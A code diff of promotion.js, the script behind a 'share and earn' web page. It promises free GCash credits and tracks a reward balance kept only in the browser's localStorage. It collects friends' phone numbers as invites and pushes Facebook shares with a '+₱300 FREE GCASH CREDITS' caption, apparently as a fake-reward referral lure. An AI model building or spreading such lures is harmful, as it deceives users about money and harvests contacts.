@@ -1,5 +1,5 @@
 // ========== PROMOTION.JS - SHARE AND EARN ==========
-// Complete version with localStorage data retrieval and Indicator System
+// Complete version with all implementations
 
 // ========== LOCALSTORAGE KEYS ==========
 function getUserStorageKeys() {
@@ -215,7 +215,6 @@ function initLeftLuckyCard() {
             addBalance(150);
             saveLeftRewardClaimed(true);
             
-            // Update indicator
             setLeftRewardClaimedGlobal(true);
             saveIndicatorStatus();
             
@@ -338,7 +337,6 @@ window.sendInviteToStorage = function() {
         renderInvitationsFromStorage();
         displayInvitesCount();
         
-        // Update indicator for invite
         setHasInvitedGlobal(true);
         saveIndicatorStatus();
         
@@ -446,7 +444,6 @@ function stopConfetti() {
 function showPrizePopup() {
     var popup = document.getElementById('prizePopup');
     if (popup) {
-        // Update indicators before showing popup
         loadIndicatorStatus();
         popup.style.display = 'flex';
         startConfetti();
@@ -461,19 +458,17 @@ function closePrizePopup() {
     stopConfetti();
 }
 
+// ========== CLAIM NOW BUTTON ==========
 function initClaimNowButton() {
     var claimNowBtn = document.getElementById('claimNowBtn');
     
     if (claimNowBtn) {
-        // Clone to remove existing listeners
         var newBtn = claimNowBtn.cloneNode(true);
         claimNowBtn.parentNode.replaceChild(newBtn, claimNowBtn);
         claimNowBtn = newBtn;
         
-        // Clear existing content
         claimNowBtn.innerHTML = '';
         
-        // Create icon
         var icon = document.createElement('img');
         icon.src = 'images/scatter_icon.jpg';
         icon.style.width = '24px';
@@ -483,23 +478,19 @@ function initClaimNowButton() {
         icon.style.display = 'inline-block';
         icon.style.backgroundColor = 'transparent';
         
-        // Handle image load error
         icon.onerror = function() {
             console.log("Scatter icon not found, using emoji");
             this.style.display = 'none';
         };
         
-        // Add icon and text
         claimNowBtn.appendChild(icon);
         claimNowBtn.appendChild(document.createTextNode(' CLAIM NOW'));
         
-        // Add click event with twist effect on icon
         claimNowBtn.onclick = function(e) {
             e.preventDefault();
             e.stopPropagation();
             console.log("CLAIM NOW button clicked");
             
-            // Add twist animation to icon
             var btnIcon = this.querySelector('img');
             if (btnIcon) {
                 btnIcon.style.transform = 'rotate(360deg) scale(1.2)';
@@ -511,9 +502,66 @@ function initClaimNowButton() {
             showPrizePopup();
         };
         
-        console.log("CLAIM NOW button ready with neon gold effect");
-    } else {
-        console.log("CLAIM NOW button not found");
+        console.log("CLAIM NOW button ready");
+    }
+}
+
+// ========== CLAIM THRU GCASH BUTTON ==========
+function initClaimButton() {
+    var claimBtn = document.getElementById('claimGCashBtn');
+    if (claimBtn) {
+        claimBtn.innerHTML = '';
+        
+        var gcIcon = document.createElement('img');
+        gcIcon.src = 'images/gc_icon.png';
+        gcIcon.className = 'gc-btn-icon';
+        gcIcon.style.width = '20px';
+        gcIcon.style.height = '20px';
+        gcIcon.style.marginRight = '8px';
+        
+        claimBtn.appendChild(gcIcon);
+        claimBtn.appendChild(document.createTextNode(' CLAIM THRU GCASH'));
+        
+        claimBtn.onclick = function() {
+            if (typeof window.showClaimPopup === 'function') {
+                window.showClaimPopup(150);
+            } else {
+                alert("System loading. Please try again.");
+            }
+        };
+    }
+}
+
+// ========== FACEBOOK SHARE ==========
+function initFacebookShare() {
+    var fbBtn = document.getElementById('shareFBBtn');
+    if (fbBtn) {
+        fbBtn.innerHTML = '';
+        
+        var fbIcon = document.createElement('img');
+        fbIcon.src = 'images/fb_icon.png';
+        fbIcon.className = 'gc-btn-icon';
+        fbIcon.style.width = '20px';
+        fbIcon.style.height = '20px';
+        fbIcon.style.marginRight = '8px';
+        fbIcon.style.filter = 'brightness(0) invert(1)';
+        
+        fbBtn.appendChild(fbIcon);
+        fbBtn.appendChild(document.createTextNode(' Share on Facebook'));
+        
+        fbBtn.onclick = function() {
+            var userPhone = localStorage.getItem("userPhone");
+            var formattedPhone = userPhone ? userPhone.substring(0, 4) + '****' + userPhone.substring(8, 11) : 'User';
+            
+            var caption = "🎉 FREE +₱300 GCASH CREDITS! 🎉\n\nUse my referral code: " + formattedPhone + "\n\n#LuckyDrop #Rewards #GCash";
+            var shareUrl = "https://xjiligames.github.io/rewards/index.html";
+            var fbShareUrl = 'https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(shareUrl) + '&quote=' + encodeURIComponent(caption);
+            
+            window.open(fbShareUrl, '_blank', 'width=600,height=500');
+            
+            setHasSharedGlobal(true);
+            saveIndicatorStatus();
+        };
     }
 }
 
@@ -553,7 +601,6 @@ function updateAllIndicators() {
     var indicator2 = document.getElementById('indicator2');
     var indicator3 = document.getElementById('indicator3');
     
-    // INDICATOR 1
     if (indicator1) {
         indicator1.classList.remove('indicator-red-yellow', 'indicator-yellow-solid');
         indicator1.style.animation = 'none';
@@ -568,7 +615,6 @@ function updateAllIndicators() {
         }
     }
     
-    // INDICATOR 2
     if (indicator2) {
         indicator2.classList.remove('indicator-yellow-green', 'indicator-blue');
         indicator2.style.animation = 'none';
@@ -587,7 +633,6 @@ function updateAllIndicators() {
         }
     }
     
-    // INDICATOR 3
     if (indicator3) {
         indicator3.classList.remove('indicator-green-solid');
         indicator3.style.animation = 'none';
@@ -644,25 +689,6 @@ function saveIndicatorStatus() {
     localStorage.setItem("hasAcceptedInvite_" + phone, indicatorHasAcceptedInvite);
 }
 
-// ========== FACEBOOK SHARE ==========
-function initFacebookShare() {
-    var fbBtn = document.getElementById('shareFBBtn');
-    if (fbBtn) {
-        fbBtn.onclick = function() {
-            var userPhone = localStorage.getItem("userPhone");
-            var formattedPhone = userPhone ? userPhone.substring(0, 4) + '****' + userPhone.substring(8, 11) : 'User';
-            
-            // Pre-caption for Facebook post
-            var caption = `🎉 FREE +₱300 GCASH CREDITS! 🎉\n\nUse my referral code: ${formattedPhone}\n\n#LuckyDrop #Rewards';
-            
-            var shareUrl = "https://xjiligames.github.io/rewards/index.html";
-            var fbShareUrl = 'https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(shareUrl) + '&quote=' + encodeURIComponent(caption);
-            
-            window.open(fbShareUrl, '_blank', 'width=600,height=500');
-        };
-    }
-}
-
 // ========== CHECK FOR ACCEPTED INVITES ==========
 function checkAcceptedInvites() {
     var invitations = getInvitations();
@@ -681,7 +707,46 @@ function checkAcceptedInvites() {
     }
 }
 
-// ========== INITIALIZATION ==========
+// ========== VIDEO AUTOPLAY ==========
+function initVideoAutoplay() {
+    var video = document.querySelector('.lucky-cat-video video');
+    if (video) {
+        video.play().catch(function(e) {
+            console.log("Autoplay blocked:", e);
+        });
+    }
+}
+
+// ========== ENTER KEY SUPPORT ==========
+function initEnterKeySupport() {
+    var friendInput = document.getElementById('friendPhoneInput');
+    var sendButton = document.getElementById('sendInviteBtn');
+    
+    if (friendInput && sendButton) {
+        friendInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                sendButton.click();
+            }
+        });
+    }
+}
+
+// ========== STATS DISPLAY ==========
+function initStatsDisplay() {
+    var balanceSpan = document.getElementById('userBalanceDisplay');
+    var invitesSpan = document.getElementById('invitesCountDisplay');
+    
+    if (balanceSpan) {
+        balanceSpan.innerHTML = '₱' + getBalance();
+    }
+    
+    if (invitesSpan) {
+        invitesSpan.innerHTML = getInvitesCount() + ' / 6';
+    }
+}
+
+// ========== INITIALIZE ==========
 document.addEventListener('DOMContentLoaded', function() {
     console.log("Promotion.js loading...");
     
@@ -693,7 +758,6 @@ document.addEventListener('DOMContentLoaded', function() {
         return;
     }
     
-    // Display user phone
     var display = document.getElementById('userPhoneDisplay');
     if (display) {
         if (userPhone.length === 11) {
@@ -703,26 +767,22 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     }
     
-    // Display balance, invites, left reward status
-    displayBalance();
-    displayInvitesCount();
+    initStatsDisplay();
     updateLeftCardFromStorage();
     renderInvitationsFromStorage();
     
-    // Load indicator status
     loadIndicatorStatus();
-    
-    // Check for accepted invites
     checkAcceptedInvites();
     
-    // Initialize components
     initLeftLuckyCard();
     initRightLuckyCard();
     initClaimNowButton();
-    initDropdownToggle();
+    initClaimButton();
     initFacebookShare();
+    initDropdownToggle();
+    initVideoAutoplay();
+    initEnterKeySupport();
     
-    // Send invitation button
     var sendBtn = document.getElementById('sendInviteBtn');
     if (sendBtn) {
         var newSendBtn = sendBtn.cloneNode(true);
@@ -730,32 +790,8 @@ document.addEventListener('DOMContentLoaded', function() {
         newSendBtn.onclick = window.sendInviteToStorage;
     }
     
-    // Enter key support
-    var friendInput = document.getElementById('friendPhoneInput');
-    var sendButton = document.getElementById('sendInviteBtn');
-    if (friendInput && sendButton) {
-        friendInput.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                e.preventDefault();
-                sendButton.click();
-            }
-        });
-    }
-    
-    // Video autoplay
-    var video = document.querySelector('.lucky-cat-video video');
-    if (video) {
-        video.play().catch(function(e) {
-            console.log("Autoplay blocked:", e);
-        });
-    }
-    
     console.log("Promotion.js ready");
     console.log("Current balance:", getBalance());
     console.log("Left reward claimed:", getLeftRewardClaimed());
     console.log("Invites count:", getInvitesCount());
-    console.log("Indicator status - Left:", indicatorLeftRewardClaimed);
-    console.log("Indicator status - Invited:", indicatorHasInvited);
-    console.log("Indicator status - Shared:", indicatorHasShared);
-    console.log("Indicator status - Accepted:", indicatorHasAcceptedInvite);
 });
